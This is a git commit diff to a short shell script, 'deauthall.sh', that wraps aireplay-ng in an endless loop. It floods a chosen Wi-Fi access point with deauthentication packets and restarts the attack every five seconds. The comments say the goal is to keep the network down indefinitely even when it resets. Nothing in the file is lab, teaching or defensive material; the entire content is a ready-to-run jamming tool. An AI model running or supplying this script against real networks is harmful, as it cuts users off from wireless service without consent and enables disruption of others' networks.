b4740ba8bf9d58086f0c4bef5bb49bdfaaf6bd57
jethr0-1 <66189463+jethr0-1@users.noreply.github.com>
2020-07-22 17:51:06 +1000

    Update deauthall.sh
    Made while loop more efficient (wish I knew about "while true" loops sooner)

--- deauthall.sh
+++ deauthall.sh
@@ -1,16 +1,15 @@
 figlet 'DeAuthAll'
 echo 'Author: Jethr0'
-if [ -z "$1" ]
+if [ -z "$1" ] # Checks for missing argument
 then
     echo '[!] Missing arguments!'
     echo 'Usage:'
     echo './deauthall.sh <targets MAC> <wireless interface>'
-else
-    NUMBER=1
-    while (( NUMBER == 1 ))
-    do
-        aireplay-ng -0 0 -a $1 $2
-        echo '[!] Network was reset. Waiting 5 seconds and recommencing attack'
-        sleep 5
-    done
+    exit
 fi
+while true # The function of the while loop here is so that the attack can go forever, even if the target AP resets itself
+do
+    aireplay-ng -0 0 -a $1 $2 # This aireplay-ng command is set to attack a network with infinite deauth packets.
+    echo '[!] Network was reset. Waiting 5 seconds and recommencing attack'
+    sleep 5
+done
